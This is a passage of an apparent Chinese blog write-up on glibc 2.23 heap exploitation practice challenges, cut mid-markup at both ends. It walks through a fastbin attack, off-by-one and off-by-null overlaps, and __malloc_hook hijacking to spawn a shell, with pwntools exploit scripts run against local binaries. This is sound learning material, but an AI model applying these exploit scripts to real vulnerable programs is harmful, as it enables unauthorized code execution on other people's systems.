class="hljs-number">0xef6c4</span>execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x50</span>, environ)<br>constraints:<br>  [rsp+<span class="hljs-number">0x50</span>] == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0xf0567</span>execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x70</span>, environ)<br>constraints:<br>  [rsp+<span class="hljs-number">0x70</span>] == <span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><p>假设我们使用第二个0x4526a，rsp+0x30的位置必须满足为null，实际调试的时候我们会发现：</p><p>在malloc函数下断点(b malloc)并continue执行来到malloc：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924195217238.png" class="" title="image-20220924195217238"><p>继续单步执行，直到经过realloc_hook进入do_system的前一步：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924195849054.png" class="" title="image-20220924195849054"><p>可以看到并不满足rsp+0x30为空值的条件，但其下方有值为null的位置，那么如何能调整rsp的位置呢。</p><p>方法就是使用realloc，我们查看其汇编会发现:</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220922161703291.png" class="" title="image-20220922161703291"><p>有多次的push操作，还有下方的sub rsp,0x38会改变栈帧，那么如果我们在malloc_hook处先填入realloc，使其跳转到realloc的某条指令处(realloc在malloc上方相邻处)，就能借助例如push去调整rsp的大小，地址每增加2字节就会少一次push(等同于一次pop)，也就意味着原来的rsp+0x38等于现在的rsp+0x30，通过这种方式调整rsp的位置直到rsp+30&#x3D;null为止就可以触发one_gadget。</p><p>按上图来讲少push两次就可以满足条件，然而实际情况是少push两次之后依然不满足条件，有点玄学：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924200120799.png" class="" title="image-20220924200120799"><p>继续尝试加，少push四次之后成功使得rsp+0x30&#x3D;NULL：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924200754219.png" class="" title="image-20220924200754219"><p>程序继续运行后getshell：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924200839865.png" class="" title="image-20220924200839865"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>l64     = <span class="hljs-keyword">lambda</span>                    :u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>l32     = <span class="hljs-keyword">lambda</span>                    :u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>s       = <span class="hljs-keyword">lambda</span> data               :io.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :io.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br>io=process(<span class="hljs-string">&#x27;./heap&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./heap&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>gdb.attach(io)<br>raw_input()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,size)<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">2</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">3</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br>sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">4</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string"> &#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>):<br>add(i,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># p()</span><br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>leak=l64()<br>libc_base=leak-<span class="hljs-number">0x3c4b78</span><br>malloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>one_gadget=libc_base+<span class="hljs-number">0x4527a</span><br>log.success(<span class="hljs-string">&quot;malloc---&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(malloc))<br><br><span class="hljs-comment"># p()</span><br>target=malloc-<span class="hljs-number">0x23</span><br><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,p64(target))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br><span class="hljs-comment"># p()</span><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>)+p64(one_gadget)+p64(realloc+<span class="hljs-number">8</span>))<br><span class="hljs-comment">#padding + og(-&gt;realloc_hook) + realloc(-&gt;malloc_hook) </span><br><br><span class="hljs-comment"># add(6,0x20,&#x27;/bin/sh&#x27;)</span><br>io.recvuntil(<span class="hljs-string">&#x27;delete\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;index:\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;6&#x27;</span>)<br>gdb.attach(io,<span class="hljs-string">&quot;b malloc&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;size:\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;32&#x27;</span>)<br>io.interactive()<br><br><br></code></pre></td></tr></table></figure><h4 id="遇到的坑点"><a href="#遇到的坑点" class="headerlink" title="遇到的坑点"></a>遇到的坑点</h4><p>还是太久没碰了，导致很多细节遗忘掉了 &#x3D;-&#x3D; 。</p><p>1.libc要用系统自带的(&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so)，因为pwntools使用的默认libc就是系统自带的,否则的话偏移会有差异导致程序异常中断，包括one_gadget的偏移也有差异。</p><p>2.最后一步add如果出现中断可以拆分执行，例如add可能只需要index和size，并不需要content，因此使用原先的可能会recv异常导致报错中断。</p><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p><strong>libc-2.23</strong></p><p>传统菜单题，没开pie和RELRO；增删改查功能都有，限制添加20个堆块，add的大小没有限制，free清空了堆块指针，不存在悬挂。</p><p>注意edit处：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925211712852.png" class="" title="image-20220925211712852"><p>v2是我们在add的时候输入的size，但read(0,size,buf)会导致我们可以多输入一个字节，正确的写法应当是read(0,size-1,buf)，因此这里有off by one可以利用，下面开始堆布局。</p><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>首先申请四个堆块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#idx 0 </span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx 1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x90</span>) <span class="hljs-comment">#idx 2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx 3</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925214653726.png" class="" title="image-20220925214653726"><p>然后编辑chunk0将chunk1的size改大(0xa1)，覆盖到chunk2，同时编辑chunk2修改prev_size为0xa0，实现chunk1与chunk2的overlap，操作后的布局如下：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925225058672.png" class="" title="image-20220925225058672"><p>这时释放chunk1进入unsortedbin，再将chunk1申请回来，这时释放chunk2，unsortedbin的地址就会同时出现在chunk1与chunk2里，最后show(1)即可完成地址泄露。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x20</span>)+p8(<span class="hljs-number">0xa1</span>))<span class="hljs-comment">#offbyone</span><br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">14</span>+p64(<span class="hljs-number">0xa0</span>)+p64(<span class="hljs-number">0x21</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0xa1</span>))<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>操作完毕的堆布局如下：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925225635985.png" class="" title="image-20220925225635985"><p>可以看到地址成功被泄露出来。</p><h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><p>泄露地址之后直接打fastbin即可，申请四个fast大小的堆块chunk，edit chunk4修改chunk5的size为0xe1覆盖chunk6；然后free6，再free5，然后再把unsortedbin中的chunk5申请出来，修改chunk6的fd指针为malloc-0x23，最后申请一个chunk写malloc_hook即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">&#x27;\xe1&#x27;</span>) <br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;abcd&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><p>执行之后打印malloc_hook：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926185455460.png" class="" title="image-20220926185455460"><p>成功写入了realloc，getshell。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926185557730.png" class="" title="image-20220926185557730"><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p><strong>libc-2.23</strong></p><p>在布局的时候出现了一些问题，我泄露地址的布局是偶尔发现的，没有考虑到此布局会影响下一步getshell的堆布局，原因在于UB切割之后剩下了0x200的堆块，这导致我在后面add的时候又从这个堆块切割了，最终会造成堆块布局的混乱。</p><p>我泄露地址的方式是发现当我add出一个堆块进行overlap的时候，chunk的data区第2个8字节是main_arena+1096，于是我就直接通过它泄露地址了。</p><p>看来还是得用常规布局，水平太菜还是按部就班吧。</p><h4 id="泄露地址-1"><a href="#泄露地址-1" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>off by null常规布局应该是合并三个堆块，但这题我合并三个堆块总是会报错，但合并四个就没问题，</p><p>由于offbynull溢出会吃掉两个字节，因此要申请0xf8的大小，也就是实际上0x100的堆块，刚好改变pre_inuse位同时不改变size。</p><p>首先申请五个堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;e&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4 can not fullfill it! otherwise it will change topchunk&#x27;s prev_inuse</span><br></code></pre></td></tr></table></figure><p>free(0)再add回来，这时候把chunk2填满，最后8字节伪造chunk3的prev_size，同时溢出\x00。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<span class="hljs-comment">#(0+1+2)</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930190350883.png" class="" title="image-20220930190350883"><p>下一步首先free(0)，以满足堆块合并，然后free(3)触发合并，最终得到0x400大小的unsortedbin_chunk。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">0</span>) <br>free(<span class="hljs-number">3</span>) <span class="hljs-comment">#touch off merge</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930190923396.png" class="" title="image-20220930190923396"><p>这时候chunk1 和chunk2都没有被free，这就完成了overlap，我在这发现，按理说申请出新堆块会清空fd和bk等指针，但是当我继续从unsortedbin切割一个堆块的时候发现，bk指针处有libc地址残留：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">3</span>,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">6</span>) <br><span class="hljs-comment">#这里填6个a是因为原fd处也有6个字节0x7f开头的数据残留，但是不全没有利用价值，因此就直接覆盖也便于识别。</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930191523723.png" class="" title="image-20220930191523723"><p>注意我们0x400堆块的开头，也就是原chunk0处会有残留的指针，而且指向的是main_arena+1096的地址，直接show就即可。</p><p>据此我们就可以计算出libc偏移为<code>1096+0x10+0x3c4b10=0x3c4f68</code>。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930192146214.png" class="" title="image-20220930192146214"><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>布局思路不变，不过我们要使用fastbin attack，就需要把第2个堆块的大小改为0x68。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br></code></pre></td></tr></table></figure><p>老规矩，先触发merge，但是这里在merge的时候出现了一个小问题，就是上次布局遗留的unsorted过多，导致这次申请堆块的时候还会切割，然后会剩下一个进入smallbin</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930192651108.png" class="" title="image-20220930192651108"><p>由于它隔在堆块中间，因此会影响合并，解决办法就是把它申请出来即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x3f0</span>)) <span class="hljs-comment"># chunk5+chunk6+chunk7 = chunk8&#x27;s prev_size</span><br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#must free the first chunk </span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x78</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#add from smallbins</span><br>free(<span class="hljs-number">8</span>) <span class="hljs-comment">#merge</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930192921207.png" class="" title="image-20220930192921207"><p>此时第2个chunk与unsorted构成了overlap，这时候申请一个可以覆盖第2个chunk fd指针的chunk，再修改fd指针，最后劫持malloc_hook即可。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930193416524.png" class="" title="image-20220930193416524"><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930193635784.png" class="" title="image-20220930193635784"><p>成功劫持。完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span> <br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span> <br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span> <br><br>l64     = <span class="hljs-keyword">lambda</span>                    :u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>l32     = <span class="hljs-keyword">lambda</span>                    :u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>s       = <span class="hljs-keyword">lambda</span> data               :io.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :io.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br>io=process(<span class="hljs-string">&quot;./offbynull&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>gdb.attach(io)<br>raw_input()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,size)<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">2</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">3</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br>sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">4</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0xf0</span>) <br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span 